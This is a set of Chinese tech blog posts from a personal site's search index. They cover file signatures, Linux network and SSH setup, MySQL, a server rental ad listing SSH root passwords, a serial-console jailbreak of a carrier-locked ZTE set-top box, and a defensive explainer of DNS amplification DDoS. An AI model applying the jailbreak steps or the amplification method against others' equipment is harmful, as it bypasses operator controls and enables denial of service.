4D 53 5F 56 4F 49 43 45 Sony Memory Stick Compressed Voice file NES 4E 45 53 NLS C2 20 20 nri 0E 4E 65 72 6F 49 53 4F Nero CD Compilation ntf 1A 00 00 Lotus Notes database template nsf; ntf 1A 00 00 03 00 00 Lotus Notes Database/Template nsf 1A 00 00 03 00 00 11 00 Notes Database nsf 1A 00 00 04 00 00 Lotus Notes database ntf 30 31 4F 52 44 4E 41 4E 43 45 20 53 55 52 56 45 59 20 20 20 20 20 20 20 National Transfer Format Map File obj 4C 01 Microsoft Common Object File Format (COFF) relocatable object code file for an Intel 386 or later/compatible processors OCX 4D 5A ActiveX or OLE Custom Control OCX 4D 5A 90 OLB 4D 5A OLE object library OLB 4D 5A 90 org; pfc 41 4F 4C 56 4D 31 30 30 AOL personal file cabinet (PFC) file pak 1A 0B Compressed archive file PAT 47 46 31 50 41 54 43 48 Advanced Gravis Ultrasound patch file PAT 47 50 41 54 GIMP (GNU Image Manipulation Program) pattern file PBK 5B 41 44 PCB 17 A1 50 PCS 0A 05 01 pcx 0A nn 01 01 ZSOFT Paintbrush file(where nn = 0x02, 0x03, or 0x05) pcx 0A 05 01 08 PC Paintbrush(often associated with Quake Engine games) pdb [11 byte offset] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Palmpilot Database/Document File PDF 25 50 44 pdf; fdf 25 50 44 46 Adobe Portable Document Format and Forms Document file pdf 25 50 44 46 2D 31 2E Adobe Acrobat PDG 48 48 02 pf 11 00 00 00 53 43 43 41 Windows prefetch file pic 01 00 00 00 01 Unknown type picture file PJT 00 00 07 PLL 24 53 6F PNG 89 50 4E PNG 89 50 4E 47 png 89 50 4E 47 0D 0A PNG Image File png 89 50 4E 47 0D 0A 1A 0A PNG Image File PPC 52 65 63 PPT D0 CF 11 ppt [512 byte offset] 00 6E 1E F0 PowerPoint presentation subheader (MS Office) ppt [512 byte offset] 0F 00 E8 03 PowerPoint presentation subheader (MS Office) PPZ 4D 53 43 46 Powerpoint Packaged Presentation prc 42 4F 4F 4B 4D 4F 42 49 Palmpilot resource file PRG 23 44 45 ps 25 21 50 53 2D 41 64 6F 62 65 Postscript PSD 38 42 50 psd 38 42 50 53 Adobe Photoshop image file psp 7E 42 4B 00 PaintShop Pro Image File pst 21 42 44 4E Microsoft Outlook Personal Folder file pwl E3 82 85 96 Windows Password qbb 45 86 00 00 06 00 Intuit QuickBooks Backup file qdf AC 9E BD 8F Quicken qph 03 00 00 00 Quicken price history file qt 6D 64 61 74 Quicktime Movie File qxd 00 00 4D 4D 58 50 52 ra 2E 52 4D 46 00 00 00 12 00 Real Audio file ra; ram 2E 72 61 FD Real Audio File ra 2E 72 61 FD 00 RealAudio streaming media file RAR 52 61 72 rar 52 61 72 21 RAR Archive File RAW 06 05 00 reg 52 45 47 45 44 49 54 34 rgb 01 DA 01 01 00 03 Silicon Graphics RGB Bitmap RM 2E 52 4D rm; rmvb 2E 52 4D 46 Real Media streaming media file rpm ED AB EE DB RPM Archive File RTD 43 23 2B 44 A4 43 4D A5 48 64 72 RagTime document file RTF 7B 5C 72 rtf 7B 5C 72 74 66 Rich Text Format File sav 24 46 4C 32 40 28 23 29 20 53 50 53 53 20 44 41 54 41 20 46 49 4C 45 SPSS Data file SBV 46 45 44 46 (Unknown file type) SCH 2A 76 65 scm 80 53 43 SH3 48 48 47 42 31 Harvard Graphics presentation file SHD 4B 49 00 00 Windows 9x printer spool file sit 53 49 54 21 Stuffit v1 Archive File sit 53 74 75 66 66 49 74 Stuffit v5 Archive File sle 3A 56 45 52 53 49 4F 4E Surfplan kite project file sle 41 43 76 teganos Security Suite virtual secure drive sly; srt; slt 53 52 01 00 Sage sly.or.srt.or.slt SMD 00 FF FF snm 00 1E 84 90 00 00 00 00 Netscape Communicator (v4) mail folder SNP 4D 53 43 46 Microsoft Access Snapshot Viewer file sol 00 BF Adobe Flash shared object file (e.g., Flash cookies) spl 00 00 01 00 Windows NT/2000/XP printer spool file SCR 4D 5A Screen saver SUB FF FF FF SWF 43 57 53 Shockwave Flash file (v5+) SWF 46 57 53 Macromedia Shockwave Flash player file sxc calc OpenOffice Calc sxd draw OpenOffice Draw sxi impress OpenOffice Impress sxm math OpenOffice Math sxw writer OpenOffice Writer syw 41 4D 59 4F Harvard Graphics symbol graphic TAG 00 00 02 tar; cpio 30 37 30 37 30 37 CPIO Archive File tar.z 1F 9D 90 Compressed tape archive file tga 00 00 10 00 00 RLE压缩的前5字节 TGA 00 00 02 tga 00 00 02 00 00 未压缩的前5字节 TIF; TIFF 49 20 49 Tagged Image File Format file tif; tiff 49 49 2A TIFF (Intel) tif; tiff 49 49 2A 00 Tagged Image File Format file (little endian, i.e., LSB first in the byte; Intel) TIF; TIFF 4D 4D 00 2A Tagged Image File Format file (big endian, i.e., LSB last in the byte; Motorola) tif; tiff 4D 4D 2A TIFF (Motorola) TIF; TIFF 4D 4D 00 2B BigTIFF files; Tagged Image File Format files &gt;4 GB TLB 4D 53 46 54 02 00 01 00 OLE, SPSS, or Visual C++ type library file tr1 01 10 Novell LANalyzer capture file TST 00 01 00 TTF 00 01 00 ufa 55 46 41 UFA Archive File VBX 4D 5A VisualBASIC application VCD 45 4E 54 52 59 56 43 44 02 00 00 01 02 00 18 58 VideoVCD (GNU VCDImager) file vcf 42 45 47 49 4E 3A 56 43 41 52 44 0D 0A vCard file vob 00 00 01 BA DVD Video Movie File (video/dvd, video/mpeg) VXD, 386 4D 5A Windows virtual device drivers WAV 52 49 46 wav 57 41 56 45 Wave wav 57 41 56 45 66 6D 74 Wave Files wb2 00 00 02 00 QuattroPro for Windows Spreadsheet file wb3 [24 byte offset] 3E 00 03 00 FE FF 09 00 06 Quatro Pro for Windows 7.0 Notebook file wk1; wks 20 00 60 40 60 Lotus 123 v1 Worksheet wk1 00 00 02 00 06 04 06 00 08 00 00 00 00 00 Lotus 1-2-3 spreadsheet (v1) file wk3 00 00 1A 00 00 10 04 00 Lotus 123 spreadsheet (v3) file wk4; wk5 00 00 1A 00 02 10 04 00 Lotus 1-2-3 spreadsheet (v4, v5) file wks 0E 57 4B 53 DeskMate Worksheet WMA 30 26 B2 wmf 01 00 09 00 Graphics Metafile wmf 01 00 09 00 00 03 Windows Metadata file (Win 3.x format) wmf 02 00 09 00 Graphics Metafile wmf D7 CD C6 9A Windows Meta File WMV 30 26 B2 wp FF 57 50 43 WordPerfect v5 or v6 wpd FF 57 50 43 WordPerfect wpg FF 57 50 47 WordPerfect Graphics wri 31 BE Microsoft Write file WRI 31 BE 00 wri 32 BE Microsoft Write file ws 1D 7D WordStar Version 5.0/6.0 document XBE 58 42 45 xdr 3C BizTalk XML-Data Reduced Schema file xls 09 02 06 00 00 00 10 00 B9 04 5C 00 MS Excel v2 xls 09 04 06 00 00 00 10 00 F6 05 5C 00 MS Excel v4 XLS D0 CF 11 xls D0 CF 11 E0 MS Excel xls [512 byte offset] 09 08 10 00 00 06 05 00 Excel spreadsheet subheader (MS Office) XML 3C 3F 78 xml 3C 3F 78 6D 6C XML Document xml FF FE 3C 00 52 00 4F 00 4F 00 54 00 53 00 54 00 55 00 42 00 XML Document (ROOTSTUB) XMV 00 50 01 XSL FF FE 3C xul 72 73 69 6F 6E 3D 22 31 3C 3F 78 6D 6C 20 76 65 2E 30 22 3F 3E XML User Interface Language file z 1F 9D TAR Compressed Archive File Z 1F 9D 8C ZIP 50 4B 03 zip; jar; zipx 50 4B 03 04 ZIP Archive zip 50 4B 30 30 ZIP Archive (outdated) Zip 50 4B 30 30 50 4B 03 04 WINZIP Compressed zoo 5A 4F 4F 20 ZOO Archive File]]></content>
      <categories>
        <category>资源收集</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[中兴机顶盒B860AV1.1破解]]></title>
    <url>%2F2019%2F08%2F24%2F%E4%B8%AD%E5%85%B4%E6%9C%BA%E9%A1%B6%E7%9B%92B860AV1-1%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[前言这个机顶盒是联通运营商赠的，所以里面有很多限制比如必须使用这个机器的宽带账号，要不然连不上网，30秒弹出一次认证界面，不可以安装第三方软件，一开始我把软件放到了SD卡准备插卡安装时，提示我禁止安装第三方软件。后来我就去百度了一下，发现有破解教程 破解教程找到成功的有两个破解教程 通过adb破解工具进行破解 通过usb转tttl线插到机顶盒板子上的开发商的接口上 我先试了第一种方法，并没有成功，可能是开发商修补了漏洞 只能使用第二种方法了，在淘宝上买了USBTOTTL(8块大洋) 准备 购买TTL线后，向店家要一个相应的驱动软件 U盘一个，用来储存当贝市场和当贝桌面，将这两个软件下载拷贝至U盘中，并将文件名改为“dangbei1”和“dangbei2”当贝市场下载地址：http://app.znds.com/update/dangbeimarket.apk 当贝桌面下载地址：http://www.dangbei.com/zhuomian/ 教程 首先将机顶盒机器后盖打开，需要用螺丝刀等工具撬开后拧下螺丝取出主板; 准备开始用USB转TTL线接线， 将TTL线的GND接2号口，RX线接5号口，TX线接6号口注意：如果稍后不能跑码的话，就将5、6接口上的线调换位置，如果还是无法跑码，就将接线顺序整体调换，意思就是反转过来重新接！！ 将USB接口插到电脑上后，安装店家给你的驱动软件，接着需要调试一些参数，右键我的电脑——属性——设备管理器——端口——COM”X”（X就是最后位数字）——属性——端口设置——改为“115200”——确定； 打开之前下载好的“PUTTY”按图中的顺序设置即可，COM后面的数字按照自己电脑的端口号输入即可，在这里记得把U盘插到机顶盒的USB接口上； 接着将盒子的盒子电源接通，通电开始跑码，如果没有跑码，注意：就将5、6接口上的线调换位置，如果还是无法跑码，就将接线顺序整体调换，意思就是整体反转过来重新接，线的顺序也要按照上述重新排序；** 成功跑码后开始输入代码，直接复制下述代码到“PUTTY”中，每输入一行按一下回车； 12start adbd 注释：打开adb** 查看U盘路径 1df 红线标出的就是U盘路径注：红线标出的U盘路径可能与你输入df后的不相符，要以当前设备的路径为准，至于如何查看，可以从U盘大小看出来，比如上图中sda1后面的数字，U盘是3.8G。 进入u盘 ,复制当贝市场和当贝桌面到盒子应用中12cp dangbei1.apk /data/appcp dangbei2.apk /data/app 启动当贝桌面1am start com.dangbei.tvlauncher ok，至此当贝市场和当贝桌面就安装成功了]]></content>
      <categories>
        <category>搞机笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[基于Docker的蜜罐平台搭建]]></title>
    <url>%2F2019%2F07%2F27%2F%E5%BC%80%E6%BA%90%E8%9C%9C%E7%BD%90%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[centos7 debian9 ubuntu16.04 修改IP及DNS]]></title>
    <url>%2F2019%2F07%2F15%2F%E4%BF%AE%E6%94%B9IP%E5%8F%8ADNS%2F</url>
    <content type="text"><![CDATA[centos7修改ip地址 ifconfig 找出网卡的名称 查看网卡为ens33 cd /etc/sysconfig/network-scripts/ —- 查看 vim ifcfg-ens33 12345678910111213141516171819202122TYPE=EthernetPROXY_METHOD=noneBROWSER_ONLY=noBOOTPROTO=noneDEFROUTE=yesIPV4_FAILURE_FATAL=noIPV6INIT=yesIPV6_AUTOCONF=yesIPV6_DEFROUTE=yesIPV6_FAILURE_FATAL=noIPV6_ADDR_GEN_MODE=stable-privacyNAME=ens33UUID=c886ea74-29f0-487c-9947-34345f1d3623DEVICE=ens33#设置开机自启ONBOOT=yes#配置IP地址信息IPADDR=192.168.100.90NETMASK=255.255.255.0GATEWAY=192.168.100.1#取消NetworkManager管理NM_CONTROLLED=no 重启网络服务 systemctl restart network 配置DNS vim /etc/NetworkManager/NetworkManager.conf 在[main]中添加 dns=no 修改resolv.conf配置文件 vim /etc/resolv.conf 添加1234#主DNS服务器nameserver 218.85.157.99#备DNS服务器nameserver 114.114.114.114 重启NetworkManager1systemctl restart NetworkManager debian9修改IP地址： 编辑文件 1vim /etc/network/interfaces 设置静态IP 1234567auto loiface lo inet lookbackauto eth0iface eth0 inet static #将网卡eth0设置为获取静态地址address 192.168.1.10 #替换为自己的IP地址netmask 255.255.255.0 #替换为自己的子网掩码gateway 192.168.1.1 #替换为自己的网关地址 设置为DHCP自动获取IP 1234auto loiface lo inet loopbackauto eth0iface eth0 inet dhcp #将网卡eth0设置为自动获取IP 重启网卡服务 debian8 systemctl restart network debian9 service networking restart 修改DNS 编辑文件 1vim /etc/resolv.conf 添加DNS 1nameserver 114.114.114.114 #替换为自己的DNS服务器地址 查询IP及测试网络连通 debian8ifconfig debian9ip addr 2.测试网络连通ping www.baidu.com ubuntu16.04修改IP地址 编辑文件vimlink1232. ```bash auto eth0 #要设置的网卡 iface eth0 inet static #设置静态IP；如果是使用自动IP用dhcp，后面的不用设置，一般少用 addressxxx.xxx.xxx.xxx #IP地址 netmaskxxx.xxx.xxx.xxx #子网掩码 gatewayxxx.xxx.xxx.xxx #网关 修改DNS 编辑vim```12345678910*上面设置的文件重启后会覆盖，如果要持久的保存，需要修改：/etc/resolvconf/resolv.conf.d/base*3. nameserver 172.16.3.4 #希望修改成的DNS nameserver 172.16.3.3 #希望修改成的DNS 4. 先运行一次，然后在rc.local里加入这个重启网络配置的命令：```bash sudo /etc/init.d/networking restart #使网卡配置生效 sudo /etc/init.d/resolvconf restart #使DNS生效]]></content>
      <categories>
        <category>linux学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[高质量服务器]]></title>
    <url>%2F2019%2F07%2F10%2F%E5%87%BA%E5%94%AE%E9%AB%98%E8%B4%A8%E9%87%8F%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[服务器免费测试地址 服务器系统 服务器ip ssh端口 用户名 root密码均为rabbit centos7 fwq.geekrabbit.xyz 522 root rabbit ubuntu16.04 fwq.geekrabbit.xyz 544 log rabbit debian9 fwq.geekrabbit.xyz 566 debian rabbit 测试机硬件配置 均为1核 512m 128g硬盘 100m带宽 数量有限售完为止 有意者加我微信：1347896323 价格表 数量有限售完为止特价 核心数 内存 硬盘 带宽 月租/元 1核 512m 128g 100m 10 2核 512m 128g 100m 15 3核 512m 128g 100m 20 4核 512m 128g 100m 25 5核 512m 128g 100m 30 6核 512m 128g 100m 35 7核 512m 128g 100m 40 8核 512m 128g 100m 45 9核 512m 128g 100m 50 10核 512m 128g 100m 55 11核 512m 128g 100m 60 12核 512m 128g 100m 65 1g内存 核心数 内存 硬盘 带宽 月租/元 1核 1g 128g 100m 20 2核 1g 128g 100m 25 3核 1g 128g 100m 30 4核 1g 128g 100m 35 5核 1g 128g 100m 40 6核 1g 128g 100m 45 7核 1g 128g 100m 50 8核 1g 128g 100m 55 9核 1g 128g 100m 60 10核 1g 128g 100m 65 11核 1g 128g 100m 70 12核 1g 128g 100m 75 1.5g内存 核心数 内存 硬盘 带宽 月租/元 1核 1.5g 128g 100m 30 2核 1.5g 128g 100m 35 3核 1.5g 128g 100m 40 4核 1.5g 128g 100m 45 5核 1.5g 128g 100m 50 6核 1.5g 128g 100m 55 7核 1.5g 128g 100m 60 8核 1.5g 128g 100m 65 9核 1.5g 128g 100m 70 10核 1.5g 128g 100m 75 11核 1.5g 128g 100m 80 12核 1.5g 128g 100m 85 2.0g内存 核心数 内存 硬盘 带宽 月租/元 1核 2g 128g 100m 40 2核 2g 128g 100m 45 3核 2g 128g 100m 50 4核 2g 128g 100m 55 5核 2g 128g 100m 60 6核 2g 128g 100m 65 7核 2g 128g 100m 70 8核 2g 128g 100m 75 9核 2g 128g 100m 80 10核 2g 128g 100m 85 11核 2g 128g 100m 90 12核 2g 128g 100m 95 2.5g内存 核心数 内存 硬盘 带宽 月租/元 1核 2.5g 128g 100m 50 2核 2.5g 128g 100m 55 3核 2.5g 128g 100m 60 4核 2.5g 128g 100m 65 5核 2.5g 128g 100m 70 6核 2.5g 128g 100m 75 7核 2.5g 128g 100m 80 8核 2.5g 128g 100m 85 9核 2.5g 128g 100m 90 10核 2.5g 128g 100m 95 11核 2.5g 128g 100m 100 12核 2.5g 128g 100m 105 3.0g内存 核心数 内存 硬盘 带宽 月租/元 1核 3g 128g 100m 60 2核 3g 128g 100m 65 3核 3g 128g 100m 70 4核 3g 128g 100m 75 5核 3g 128g 100m 80 6核 3g 128g 100m 85 7核 3g 128g 100m 90 8核 3g 128g 100m 95 9核 3g 128g 100m 100 10核 3g 128g 100m 105 11核 3g 128g 100m 110 12核 3g 128g 100m 115 3.5g内存 核心数 内存 硬盘 带宽 月租/元 1核 3.5g 128g 100m 70 2核 3.5g 128g 100m 75 3核 3.5g 128g 100m 80 4核 3.5g 128g 100m 85 5核 3.5g 128g 100m 90 6核 3.5g 128g 100m 95 7核 3.5g 128g 100m 100 8核 3.5g 128g 100m 105 9核 3.5g 128g 100m 110 10核 3.5g 128g 100m 115 11核 3.5g 128g 100m 120 12核 3.5g 128g 100m 125 4.0g内存 核心数 内存 硬盘 带宽 月租/元 1核 4g 128g 100m 80 2核 4g 128g 100m 85 3核 4g 128g 100m 90 4核 4g 128g 100m 95 5核 4g 128g 100m 100 6核 4g 128g 100m 105 7核 4g 128g 100m 110 8核 4g 128g 100m 115 9核 4g 128g 100m 120 10核 4g 128g 100m 125 11核 4g 128g 100m 130 12核 4g 128g 100m 135 4.5g内存 核心数 内存 硬盘 带宽 月租/元 1核 4.5g 128g 100m 90 2核 4.5g 128g 100m 95 3核 4.5g 128g 100m 100 4核 4.5g 128g 100m 105 5核 4.5g 128g 100m 110 6核 4.5g 128g 100m 115 7核 4.5g 128g 100m 120 8核 4.5g 128g 100m 125 9核 4.5g 128g 100m 130 10核 4.5g 128g 100m 135 11核 4.5g 128g 100m 140 12核 4.5g 128g 100m 145 5.0g内存 核心数 内存 硬盘 带宽 月租/元 1核 5g 128g 100m 100 2核 5g 128g 100m 105 3核 5g 128g 100m 110 4核 5g 128g 100m 115 5核 5g 128g 100m 120 6核 5g 128g 100m 125 7核 5g 128g 100m 130 8核 5g 128g 100m 135 9核 5g 128g 100m 140 10核 5g 128g 100m 145 11核 5g 128g 100m 150 12核 5g 128g 100m 155 5.5g内存 核心数 内存 硬盘 带宽 月租/元 1核 5.5g 128g 100m 110 2核 5.5g 128g 100m 115 3核 5.5g 128g 100m 120 4核 5.5g 128g 100m 125 5核 5.5g 128g 100m 130 6核 5.5g 128g 100m 135 7核 5.5g 128g 100m 140 8核 5.5g 128g 100m 145 9核 5.5g 128g 100m 150 10核 5.5g 128g 100m 155 11核 5.5g 128g 100m 160 12核 5.5g 128g 100m 165 6.0g内存 核心数 内存 硬盘 带宽 月租/元 1核 6g 128g 100m 120 2核 6g 128g 100m 125 3核 6g 128g 100m 130 4核 6g 128g 100m 135 5核 6g 128g 100m 140 6核 6g 128g 100m 145 7核 6g 128g 100m 150 8核 6g 128g 100m 155 9核 6g 128g 100m 160 10核 6g 128g 100m 165 11核 6g 128g 100m 170 12核 6g 128g 100m 175 6.5g内存 核心数 内存 硬盘 带宽 月租/元 1核 6.5g 128g 100m 130 2核 6.5g 128g 100m 135 3核 6.5g 128g 100m 140 4核 6.5g 128g 100m 145 5核 6.5g 128g 100m 150 6核 6.5g 128g 100m 155 7核 6.5g 128g 100m 160 8核 6.5g 128g 100m 165 9核 6.5g 128g 100m 170 10核 6.5g 128g 100m 175 11核 6.5g 128g 100m 180 12核 6.5g 128g 100m 185 7.0g内存 核心数 内存 硬盘 带宽 月租/元 1核 7g 128g 100m 140 2核 7g 128g 100m 145 3核 7g 128g 100m 150 4核 7g 128g 100m 155 5核 7g 128g 100m 160 6核 7g 128g 100m 165 7核 7g 128g 100m 170 8核 7g 128g 100m 175 9核 7g 128g 100m 180 10核 7g 128g 100m 185 11核 7g 128g 100m 190 12核 7g 128g 100m 195 7.5g内存 核心数 内存 硬盘 带宽 月租/元 1核 7.5g 128g 100m 150 2核 7.5g 128g 100m 155 3核 7.5g 128g 100m 160 4核 7.5g 128g 100m 165 5核 7.5g 128g 100m 170 6核 7.5g 128g 100m 175 7核 7.5g 128g 100m 180 8核 7.5g 128g 100m 185 9核 7.5g 128g 100m 190 10核 7.5g 128g 100m 195 11核 7.5g 128g 100m 200 12核 7.5g 128g 100m 205 8.0g内存 核心数 内存 硬盘 带宽 月租/元 1核 8g 128g 100m 160 2核 8g 128g 100m 165 3核 8g 128g 100m 170 4核 8g 128g 100m 175 5核 8g 128g 100m 180 6核 8g 128g 100m 185 7核 8g 128g 100m 190 8核 8g 128g 100m 195 9核 8g 128g 100m 200 10核 8g 128g 100m 205 11核 8g 128g 100m 210 12核 8g 128g 100m 215]]></content>
  </entry>
  <entry>
    <title><![CDATA[parrot安装完成后的部署]]></title>
    <url>%2F2019%2F07%2F06%2Fparrot%E5%AE%89%E8%A3%85%E5%AE%8C%E6%88%90%E5%90%8E%E7%9A%84%E9%83%A8%E7%BD%B2%2F</url>
    <content type="text"><![CDATA[配置SSH安装ssh1sudo apt install ssh 编辑sshd_config文件1sudo vi /etc/ssh/sshd_config 设置允许密码登陆将12#PasswordAuthentication yes` 前面的注释符去掉 设置允许root登陆(不建议)将sshd_config文件中的语句1#PermitRootLogin prohibit-password 修改为：1PermitRootLogin yes 并去掉前面的注释符 保存文件,启动SSH服务1sudo systemctl start ssh 或重启ssh服务1sudo systemctl restart ssh 设置SSH开机自启动1sudo systemctl enable ssh 换源首先在终端中输入这条命令(以管理员身份)打开源文件：1sudo vi /etc/apt/sources.list.d/parrot.list 然后添加源 (我用着两个）12deb http://mirrors.ustc.edu.cn/parrot/ parrot main contrib non-freedeb http://mirrors.tuna.tsinghua.edu.cn/parrot/ parrot main contrib non-free 由于Parrot Security支持的源很多，我们又是在国内，我重点说一下Parrot Security中国国内的镜像源有哪些？ 1、中国科技大学和USTCLUG 1deb http://mirrors.ustc.edu.cn/parrot parrot main contrib non-free 2、TUNA（北京清华大学，TUNA协会） 1deb https://mirrors.tuna.tsinghua.edu.cn/parrot/ parrot main contrib non-free 3、SHU（上海大学） 1deb https://mirrors.shu.edu.cn/parrot/ parrot main contrib non-free 4、SJTUG（上海交通大学* NIX用户组） 1deb https://mirrors.sjtug.sjtu.edu.cn/parrot/ parrot main contrib non-free]]></content>
      <tags>
        <tag>学习经验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[虚拟机web化管理工具-jimv]]></title>
    <url>%2F2019%2F06%2F22%2F%E8%99%9A%E6%8B%9F%E6%9C%BAweb%E5%8C%96%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7-jimv%2F</url>
    <content type="text"><![CDATA[jimv是什么jimv是基于kvm进行开发，从而对其主要功能进行web化对接，各方面功能也都还是相当优秀的，结构清晰简单，易于部署、维护、使用的，低门槛企业私有云管理平台。相比于业界知名的 OpenStack、OpenNebula…，JimV 没有很多的零部件，不需要庞大的维护团队。 VMWare部署思路和教程思路 由于 VMWare 默认不支持 iPXE，可以下载 ipxe.iso 镜像变通达成目的 配置好后就开始下载centos7,差不多20分钟左右。 系统安装好后，jimv也就部署好了，直接浏览器（最好用谷歌浏览器）访问他的IP 直接初始化，在往jimv服务器里导入系统模板，配置ip池，创建磁盘，最后创建虚拟机，也就是虚拟机里安装虚拟机 教程 由于 VMWare 默认不支持 iPXE，大家可以下载 ipxe.iso 镜像变通达成目的。进入黑屏后按ctrl+b,大概20分钟自动部署完成。 上传系统镜像模板 模板地址存放系统模板到，任意一个计算节点的 /opt/template_images 目录下即可。该目录已经自动做好了计算节点间的 NFS 共享。 创建虚拟机模板在 JimV-C 控制面板，模板镜像中添加虚拟机模板。 添加 IP 池在 JimV-C 控制面板，系统配置中添加 IP 池。（添加的IP一定要和jimv在一个网段，否则无法上网） 享受”简单、快速开”创虚拟机实例的快乐。。。。 本次教程参考jimv正微官方网站本次搭建踩到了很多的坑，是jimv的官方qq群：377907881 的群主对我提供了很多帮助，要不然又要浪费好多的时间去琢磨了，在这里我表示感谢。]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库插入和删除表数据（八）]]></title>
    <url>%2F2019%2F06%2F21%2FMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%92%E5%85%A5%E5%92%8C%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%EF%BC%88%E5%85%AB%EF%BC%89%2F</url>
    <content type="text"><![CDATA[MySQL 插入数据1INSERT INTO table_name ( field1, field2,...fieldN ) VALUES ( value1, value2,...valueN ); 123456789mysql&gt; show columns from runoob_tbl;+-----------------+------------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+-----------------+------------------+------+-----+---------+----------------+| runoob_id | int(10) unsigned | NO | PRI | NULL | auto_increment || runoob_title | varchar(100) | NO | | NULL | || runoob_author | varchar(40) | NO | | NULL | || submission_date | date | YES | | NULL | |+-----------------+------------------+------+-----+---------+----------------+ 12345678910111213mysql&gt; insert into runoob_tbl -&gt; (runoob_title, runoob_author, submission_date) -&gt; values -&gt; ("学习 mysql", "好简单", NOW());Query OK, 1 row affected, 1 warning (0.13 sec)mysql&gt; select * from runoob_tbl -&gt; ;+-----------+--------------+---------------+-----------------+| runoob_id | runoob_title | runoob_author | submission_date |+-----------+--------------+---------------+-----------------+| 2 | 学习 mysql | 好简单 | 2019-06-21 |+-----------+--------------+---------------+-----------------+]]></content>
      <categories>
        <category>MySQL数据库学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[DDOS攻击之DNS放大攻击（三）]]></title>
    <url>%2F2019%2F06%2F19%2FDDOS%E6%94%BB%E5%87%BB%E4%B9%8BDNS%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[DNS放大攻击如何工作？DNS放大攻击中的一个机器人可以被认为是一个恶意的少年打电话给餐馆并说“我把餐馆的位置都定下来，请给我回电话并告诉我整个订单。”当餐厅要求时一个回叫号码，给出的号码是目标受害者的电话号码。然后，目标接收来自餐馆的电话，其中包含许多他们未请求的信息。 DNS放大可分为四个步骤： 攻击者使用受损端点将带有欺骗性IP地址的UDP数据包发送到DNS recursor。数据包上的欺骗地址指向受害者的真实IP地址。 每个UDP数据包都向DNS解析器发出请求，通常会传递诸如“ANY”之类的参数，以便接收可能的最大响应。 在收到请求后，尝试通过响应提供帮助的DNS解析器会向欺骗的IP地址发送大量响应。 目标的IP地址接收响应，周围的网络基础设施因流量泛滥而变得不堪重负，导致拒绝服务。 攻击原理 伪造源地址为被攻击目标地址，向递归域名查询服务器发起请求 DNS服务器称为流量放大和实施攻击者，大量DNS服务器实现DDoS 如何防御这种大规模攻击呢? 首先，保证你拥有足够的带宽承受小规模的洪水般的攻击。一个单一的T1线路对于重要的互联网连接是不够的，因为任何恶意的脚本少年都可以消耗掉你的带宽。如果你的连接不是执行重要任务的，一条T1线路就够了。否则，你就需要更多的带宽以便承受小规模的洪水般的攻击。不过，几乎任何人都无法承受每秒钟数GB的DNS放大攻击。 对于运营网站或服务的个人或公司，缓解选项是有限的。这是因为个人的服务器虽然可能是目标，但却不会感受到体积攻击的主要影响。由于产生了大量流量，服务器周围的基础设施会产生影响。Internet服务提供商（ISP）或其他上游基础架构提供商可能无法处理传入流量而不会变得不堪重负。因此，ISP可能将所有流量黑洞到目标受害者的IP地址，保护自己并使目标站点脱机。除Cloudflare DDoS保护等非现场保护服务外，缓解策略主要是预防性互联网基础设施解决方案。 减少打开DNS解析器的总数DNS放大攻击的一个重要组成部分是访问开放式DNS解析器。通过将配置不当的DNS解析器暴露给Internet，攻击者需要做的就是利用DNS解析器来发现它。理想情况下，DNS解析器应仅向源自受信任域的设备提供其服务。在基于反射的攻击的情况下，开放的DNS解析器将响应来自Internet上任何地方的查询，从而允许利用漏洞。限制DNS解析器以使其仅响应来自可信源的查询使得服务器成为任何类型的放大攻击的不良工具。 源IP验证 - 停止欺骗数据包离开网络由于攻击者僵尸网络发送的UDP请求必须具有欺骗受害者IP地址的源IP地址，因此降低基于UDP的放大攻击有效性的关键组件是Internet服务提供商（ISP）拒绝任何内部流量欺骗的IP地址。如果从网络内部发送一个数据包，其源地址使其看起来像是在网络外部发起的，那么它可能是一个欺骗性数据包，可以被丢弃。Cloudflare强烈建议所有提供商实施入口过滤，有时会联系那些不知不觉地参与DDoS攻击并帮助他们实现漏洞的ISP。 Cloudflare如何减轻DNS放大攻击？通过正确配置的防火墙和足够的网络容量（除非您的大小与Cloudflare相当，并不总是很容易），阻止DNS放大攻击等反射攻击是微不足道的。虽然攻击将针对单个IP地址，但我们的Anycast网络会将所有攻击流量分散到不再具有破坏性的程度。Cloudflare能够利用我们的规模优势在多个数据中心内分配攻击的重量，平衡负载，从而不会中断服务，攻击永远不会超过目标服务器的基础架构。在最近的六个月窗口中，我们的DDoS缓解系统“Gatebot”检测到6,329次简单反射攻击（每40分钟一次），网络成功地减轻了所有这些攻击。]]></content>
      <categories>
        <category>DDOS攻防学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[DDOS攻击之syn-flood（二）]]></title>
    <url>%2F2019%2F06%2F18%2FDDOS%E6%94%BB%E5%87%BB%E4%B9%8Bsyn-flood%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
